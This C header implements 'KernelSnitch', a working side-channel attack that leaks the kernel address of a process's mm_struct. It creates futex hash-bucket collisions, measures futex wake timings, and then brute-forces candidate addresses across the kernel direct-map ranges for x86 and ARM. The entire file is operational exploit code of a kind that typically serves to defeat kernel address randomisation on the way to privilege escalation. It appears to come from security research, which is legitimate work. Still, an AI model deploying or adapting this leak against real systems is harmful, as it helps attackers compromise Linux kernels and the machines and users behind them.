#pragma once

#include "timeutils.h"
#include "utils.h"
#include "futex_hash.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#if !defined(__ARM) && !defined(__INTEL) && !defined(__AMD)
#define __INTEL
#endif

#define FUTEX_SZ (64ULL<<30)
#define FUTEX_MMAP_SZ (1ULL<<30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#define APPENDED_FUTEXES 1024
#define MULITPLE 4
#if defined(__INTEL) || defined(__AMD)
#define IDENTITY_START 0xffff888000000000ULL
#define IDENTITY_END   0xffffc88000000000ULL
#define COARSE_SZ (1ULL << 30)
#elif defined(__ARM)
#define VA_BITS 39
#if VA_BITS==39
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL<<30))
#endif
#define IDENTITY_START KERNELSNITCH_IDENTITY_START
#define IDENTITY_END   KERNELSNITCH_IDENTITY_END
// #define IDENTITY_END   0xffffffc000000000ULL
#elif VA_BITS==48
#define IDENTITY_START 0xffff000000000000ULL
#define IDENTITY_END   0xffff800000000000ULL
#else
#error "Unsupported VA_BITS (expected 39 or 48)"
#endif
#define COARSE_SZ (1ULL << 30)
#endif

enum kernelsnitch_state {
    KERNELSNITCH_NOT_INIT = 0,
    KERNELSNITCH_INIT,
    KERNELSNITCH_COLLISIONS_FOUND,
    KERNELSNITCH_COLLISIONS_NOT_FOUND,
    KERNELSNITCH_MM_FOUND,
    KERNELSNITCH_MM_NOT_FOUND,
    KERNELSNITCH_LAST,
};
char *kernelsnitch_strings[KERNELSNITCH_LAST] = {
    "not initialized",
    "initialized",
    "collisions found",
    "mm_struct found",
    "mm_struct not found",
};

struct kernelsnitch_shared_state {
    volatile size_t mm_struct_sz;
    volatile size_t mm_slab_order;
    volatile size_t verbose;

    size_t collisions;
    size_t thread_cnt;
    size_t cpu_cnt;
    size_t futex_hash_table_size;
    size_t total_futexes;

    volatile unsigned char *futexes;
    volatile unsigned char inc_futex[PAGE_SIZE];

    volatile size_t *futex_addrs;
    volatile size_t *times;
    volatile size_t found;
    volatile size_t mm_struct;
    volatile size_t scan_done;

    pthread_t *tids;
    size_t identity_diff;

    enum kernelsnitch_state state;
};

#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)

/**
 * FUTEX syscall
 */
static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

/**
 * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the increase
 */
struct inc_arg {
    struct kernelsnitch_shared_state *ks;
    size_t id;
};
static void *__do_increase(void *arg)
{
    struct inc_arg *inc_arg = (struct inc_arg *)arg;
    struct kernelsnitch_shared_state *ks = inc_arg->ks;
    size_t id = inc_arg->id;
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
    free(inc_arg);
    return 0;
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg amount: increase
 */
static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
{
    pthread_t tid;
    for (size_t i = 0; i < amount; ++i) {
        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
        inc_arg->id = id;
        inc_arg->ks = ks;
        int err = pthread_create(&tid, 0, __do_increase, (void *)inc_arg);
        if (err)
            pr_error("pthread_create failed: %s\n", strerror(err));
        err = pthread_detach(tid);
        if (err)
            pr_error("pthread_detach failed: %s\n", strerror(err));
    }
    WAIT();
}

/**
 * Simple compare
 */
#define MEASURE_FAST_REPEAT 8
#define MEASURE_FAST_AVG    4
#define MEASURE_SLOW_REPEAT 16
#define MEASURE_SLOW_AVG    8

static int __compare(const void *a, const void *b)
{
    return (*(size_t *)a - *(size_t *)b);
}

/**
 * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
 * @arg repeat: samples per measurement
 * @arg avg: lowest samples used for the average
 * @return averaged time of the futex wait operation
 */
static size_t __measure(size_t futex_addr, size_t repeat, size_t avg)
{
    size_t t0;
    size_t t1;
    size_t time = 0;
    // do some simple signal processing and reject bad ones
    size_t __times[16];
    for (size_t l = 0; l < repeat; ++l) {
        sched_yield();
        t0 = rdtsc_begin();
        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
        t1 = rdtsc_end();
        __times[l] = t1 - t0;
    }
    qsort(__times, repeat, sizeof(size_t), __compare);
    for (size_t l = 0; l < avg; ++l)
        time += __times[l];
    time /= avg;
    return time;
}

/**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
struct range {
    size_t id;
    size_t start;
    size_t end;
};
struct mm_leak_arg {
    struct kernelsnitch_shared_state *ks;
    struct range range;
    int try_canonical;
    int sweep_tags;
};

static int __mm_candidate_matches(struct kernelsnitch_shared_state *ks, size_t candidate)
{
    for (size_t i = 1; i < ks->collisions; ++i) {
        if (futex_hash(ks->futex_addrs[0], candidate) != futex_hash(ks->futex_addrs[i], candidate))
            return 0;
    }
    return 1;
}

static void __mm_mark_found(struct kernelsnitch_shared_state *ks, size_t candidate)
{
    if (ks->verbose)
        pr_info("found mm_struct %016zx\n", candidate);
    ks->mm_struct = candidate;
    ks->found = 1;
}

static void *__mm_leak(void *arg)
{
    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
    struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
    struct range *range = &mm_leak_arg->range;
    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
    size_t mm_slab_sz = PAGE_SIZE << ks->mm_slab_order;
    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
        if ((coarse_addr % (1ULL << 40)) == 0)
            if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {

                if (mm_leak_arg->try_canonical) {
                    size_t canonical_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (0xfULL << 56);
                    if (__mm_candidate_matches(ks, canonical_candidate)) {
                        __mm_mark_found(ks, canonical_candidate);
                        break;
                    }
                }

                if (mm_leak_arg->sweep_tags) {
                    for (size_t tag_candidate = 0; tag_candidate < 16 && !ks->found; ++tag_candidate) {
                        if (tag_candidate == 15)
                            continue;
                        size_t tagged_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (tag_candidate << 56);
                        if (__mm_candidate_matches(ks, tagged_candidate)) {
                            __mm_mark_found(ks, tagged_candidate);
                            break;
                        }
                    }
                }
            }
        }
    }
    free(mm_leak_arg);
    return 0;
}

static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_canonical, int sweep_tags)
{
    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
        mm_leak_arg->ks = ks;
        mm_leak_arg->range.id = i;
        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
        mm_leak_arg->try_canonical = try_canonical;
        mm_leak_arg->sweep_tags = sweep_tags;
        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
    }
    for (size_t i = 0; i < ks->thread_cnt; ++i)
        pthread_join(ks->tids[i], 0);
}

/****************************************************************************************************************/
/* EXTERNAL FUNCTIONS                                                                                           */
/****************************************************************************************************************/

/**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info, 1 enables and 0 disables
 * @return shared KernelSnitch state
 */
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose)
{
    struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->mm_struct = -1;
    ks->scan_done = 0;
    ks->mm_struct_sz = __mm_struct_sz;
    ks->mm_slab_order = __mm_slab_order;
    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
    ks->thread_cnt = __thread_cnt;
    ks->collisions = __collision_cnt;
    ks->verbose = __verbose;

    // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
    ks->futex_hash_table_size = 256*ks->cpu_cnt;
    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
    ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
    for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
    ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);

    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));

    if (ks->verbose) pr_info("parameters cpu (%zu) mm_struct sz (%zx) mm slab order (%zu) thread cnt (%zu) collisions (%zu)\n",
        ks->cpu_cnt,
        ks->mm_struct_sz,
        ks->mm_slab_order,
        ks->thread_cnt,
        ks->collisions);
    pin_to_core(CORE);
    futex_init();

    ks->state = KERNELSNITCH_INIT;
    return ks;
}

#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 10
#endif
#ifndef KERNELSNITCH_COLLISION_POOL
#define KERNELSNITCH_COLLISION_POOL 64
#endif
#ifndef KERNELSNITCH_EARLY_PROBE_MIN_EXTRA
#define KERNELSNITCH_EARLY_PROBE_MIN_EXTRA 4
#endif
#ifndef KERNELSNITCH_EARLY_CHEAP_MIN_EXTRA
#define KERNELSNITCH_EARLY_CHEAP_MIN_EXTRA 3
#endif
#ifndef KERNELSNITCH_EARLY_CHEAP_POOL
#define KERNELSNITCH_EARLY_CHEAP_POOL 16
#endif

typedef struct { size_t t, addr; } coll_cand_t;

static size_t __collision_pool_limit(size_t wanted, size_t verify_limit)
{
    if (verify_limit < wanted)
        verify_limit = wanted;
    if (verify_limit > KERNELSNITCH_COLLISION_POOL)
        verify_limit = KERNELSNITCH_COLLISION_POOL;
    return verify_limit;
}

static size_t __screen_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *best, size_t verify_approx_time, size_t verify_repeat, size_t verify_avg, size_t verify_limit, coll_cand_t *verified)
{
    size_t wanted = ks->collisions - 1;
    size_t n_verified = 0;
    verify_limit = __collision_pool_limit(wanted, verify_limit);
    if (ks->verbose) pr_info("screening piled candidates limit=%zu\n", verify_limit);
    for (size_t j = 0; j < verify_limit && best[j].t; ++j) {
        size_t t1 = __measure(best[j].addr, verify_repeat, verify_avg);
        if (t1 > verify_approx_time*KERNELSNITCH_THRESHOLD_MULT) {
            verified[n_verified].t = t1;
            verified[n_verified].addr = best[j].addr;
            n_verified++;
            if (ks->verbose) pr_info("  piled   %016zx scan=%zu verify=%zu\n", best[j].addr, best[j].t, t1);
        } else if (ks->verbose) {
            pr_info("  reject   %016zx scan=%zu verify=%zu\n", best[j].addr, best[j].t, t1);
        }
    }
    return n_verified;
}

static size_t __prove_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *verified, size_t n_verified, size_t verify_approx_time, size_t verify_repeat, size_t verify_avg, size_t id, int drain_on_short)
{
    size_t wanted = ks->collisions - 1;
    /* pass 1 drains the pile.
       Piled-bucket colliders collapse while ambient buckets stay slow. */
    __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, NULL, NULL, 0);
    usleep(200000);
    size_t alive[KERNELSNITCH_COLLISION_POOL];
    size_t alive_t[KERNELSNITCH_COLLISION_POOL];
    size_t n_alive = 0;
    if (ks->verbose) pr_info("verifying %zu candidates after pile drain\n", n_verified);
    for (size_t j = 0; j < n_verified; ++j) {
        size_t t2 = __measure(verified[j].addr, verify_repeat, verify_avg);
        if (t2 < verified[j].t / 2) {
            alive[n_alive] = verified[j].addr;
            alive_t[n_alive] = verified[j].t;
            n_alive++;
            if (ks->verbose) pr_info("  drained  %016zx t=%zu after=%zu\n", verified[j].addr, verified[j].t, t2);
        } else if (ks->verbose) {
            pr_info("  reject   %016zx t=%zu after=%zu\n", verified[j].addr, verified[j].t, t2);
        }
    }
    /* pass 2 re-piles.
       Only real colliders go slow again. */
    __increase(ks, id, APPENDED_FUTEXES);
    size_t count = 0;
    for (size_t j = 0; j < n_alive && count < wanted; ++j) {
        size_t t3 = __measure(alive[j], verify_repeat, verify_avg);
        if (t3 > verify_approx_time*KERNELSNITCH_THRESHOLD_MULT) {
            ks->futex_addrs[++count] = alive[j];
            if (ks->verbose) pr_info("  collider %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
        } else if (ks->verbose) {
            pr_info("  reject   %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
        }
    }
    if (count < wanted && drain_on_short) {
        /* leave the bucket drained so a conservative retry starts clean */
        __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, NULL, NULL, 0);
        usleep(200000);
    }
    return count;
}

static size_t __verify_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *best, size_t verify_approx_time, size_t verify_repeat, size_t verify_avg, size_t verify_limit, size_t id, int drain_on_short)
{
    coll_cand_t verified[KERNELSNITCH_COLLISION_POOL];
    size_t n_verified = __screen_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, verify_limit, verified);
    return __prove_collision_pool(ks, verified, n_verified, verify_approx_time, verify_repeat, verify_avg, id, drain_on_short);
}

/* One full scan pass returns confirmed colliders, excluding the target */
static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan_repeat, size_t scan_avg, size_t verify_repeat, size_t verify_avg)
{
#define ID 128
    size_t wanted = ks->collisions - 1;
    size_t scan_approx_time = MIN(__measure((size_t)&ks->futexes[0], scan_repeat, scan_avg),
                                  __measure((size_t)&ks->futexes[4096+8], scan_repeat, scan_avg));
    size_t verify_approx_time = MIN(__measure((size_t)&ks->futexes[0], verify_repeat, verify_avg),
                                    __measure((size_t)&ks->futexes[4096+8], verify_repeat, verify_avg));

    /* piled-up hash bucket ID 128 */
    __increase(ks, ID, APPENDED_FUTEXES);
    if (ks->verbose) pr_info("pass scan=%zu/%zu verify=%zu/%zu\n", scan_repeat, scan_avg, verify_repeat, verify_avg);

    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
    /* pool of slow candidates, verified below */
    coll_cand_t *best = calloc(KERNELSNITCH_COLLISION_POOL, sizeof(coll_cand_t));
    ASSERT_pr(best, "calloc best\n");
    size_t cheap_probe_extra = MAX((wanted + 2) / 3, (size_t)KERNELSNITCH_EARLY_CHEAP_MIN_EXTRA);
    size_t cheap_probe_after = ks->futex_hash_table_size * (wanted + cheap_probe_extra);
    size_t full_probe_extra = MAX((wanted + 1) / 2, (size_t)KERNELSNITCH_EARLY_PROBE_MIN_EXTRA);
    size_t full_probe_after = ks->futex_hash_table_size * (wanted + full_probe_extra);
    int cheap_probed = (cheap_probe_after >= full_probe_after ||
                        cheap_probe_after >= ks->total_futexes ||
                        wanted > KERNELSNITCH_EARLY_CHEAP_POOL ||
                        wanted > KERNELSNITCH_COLLISION_POOL);
    int full_probed = (full_probe_after >= ks->total_futexes || wanted > KERNELSNITCH_COLLISION_POOL);
    for (size_t i = 2; i < ks->total_futexes; ++i) {
        if (ks->verbose && (i % 256) == 0)
            pr_info("  collision scan %zu/%zu\n", i, ks->total_futexes);
        size_t id = (i*4096) | (i*8 % 4096);
        if (id >= FUTEX_SZ)
            break;
        size_t futex_addr = (size_t)&ks->futexes[id];
        ks->scan_done = i;
        ks->times[i] = __measure(futex_addr, scan_repeat, scan_avg);
        if (ks->times[i] > (scan_approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
            size_t pos = KERNELSNITCH_COLLISION_POOL;
            for (size_t j = 0; j < KERNELSNITCH_COLLISION_POOL; ++j) {
                if (ks->times[i] > best[j].t) { pos = j; break; }
            }
            if (pos < KERNELSNITCH_COLLISION_POOL) {
                for (size_t j = KERNELSNITCH_COLLISION_POOL - 1; j > pos; --j)
                    best[j] = best[j-1];
                best[pos].t = ks->times[i];
                best[pos].addr = futex_addr;
            }
        }
        if (!cheap_probed && i >= cheap_probe_after && best[wanted - 1].t) {
            cheap_probed = 1;
            coll_cand_t cheap_verified[KERNELSNITCH_COLLISION_POOL];
            size_t screened = __screen_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, KERNELSNITCH_EARLY_CHEAP_POOL, cheap_verified);
            pr_info("[spray] early collision screen %zu/%zu at %zu%%\n",
                    screened, wanted, ks->total_futexes ? i * 100 / ks->total_futexes : 0);
            if (screened >= wanted) {
                size_t count = __prove_collision_pool(ks, cheap_verified, screened, verify_approx_time, verify_repeat, verify_avg, ID, 0);
                if (count == wanted) {
                    free(best);
                    return count;
                }
                if (ks->verbose) pr_info("early small proof found %zu/%zu collisions, continuing scan\n", count, wanted);
            }
        }
        if (!full_probed && i >= full_probe_after && best[wanted - 1].t) {
            full_probed = 1;
            if (ks->verbose) pr_info("early verifying at scan %zu/%zu\n", i, ks->total_futexes);
            size_t count = __verify_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, KERNELSNITCH_COLLISION_POOL, ID, 0);
            if (count == wanted) {
                free(best);
                return count;
            }
            if (ks->verbose) pr_info("early verification found %zu/%zu collisions, continuing scan\n", count, wanted);
        }
    }
    size_t count = __verify_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, KERNELSNITCH_COLLISION_POOL, ID, 1);
    free(best);
    return count;
#undef ID
}

/**
 * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
    if (ks->verbose) pr_info("start finding collisions\n");

    size_t wanted = ks->collisions - 1;
    size_t count = __collision_pass(ks, MEASURE_FAST_REPEAT, MEASURE_FAST_AVG, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG);
    if (count < wanted) {
        pr_warning("fast pass found %zu/%zu collisions; retrying conservative\n", count, wanted);
        count = __collision_pass(ks, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG);
    }
    if (wanted == count) {
        if (ks->verbose) pr_info("found %zu collisions\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    } else {
        pr_warning("only found %zu collisions -> cannot continue\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
    }
}
size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
    return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
}

/**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
    if (ks->verbose) pr_info("start bruteforcing\n");
    reset_cpu_pin();

    __run_mm_leak_pass(ks, 1, 0);
    if (!ks->found)
        __run_mm_leak_pass(ks, 0, 1);
    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
}

/**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
    munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
    ks->times = 0;
    munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
    ks->tids = 0;
    munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
    ks->futex_addrs = 0;
    munmap((void *)ks->futexes, FUTEX_SZ);
    ks->futexes = 0;
    size_t ret = ks->mm_struct;
    if (ks->verbose) pr_info("done\n");
    munmap(ks, sizeof(struct kernelsnitch_shared_state));
    return ret;
}

/**
 * Performs KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info, 1 enables and 0 disables
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose)
{
    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_find_collisions(ks);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_bruteforce(ks);
    if (ks->verbose) pr_info("===============================================\n");
    return kernelsnitch_cleanup(ks);
}

/**
 * Prints the current execution state KernelSnitch is in
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
{
    pr_info("ks state: %s\n", kernelsnitch_strings[ks->state]);
}

/**
 * Prints the found collisions
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
{
    pr_info("collisions:\n");
    for (size_t i = 2; i < ks->collisions; ++i) {
        size_t addr = ks->futex_addrs[i];
        pr_info("  %016zx\n", addr);
    }
}

/**
 * KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @return: the found mm_struct address
 */
size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
{
    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0);
}
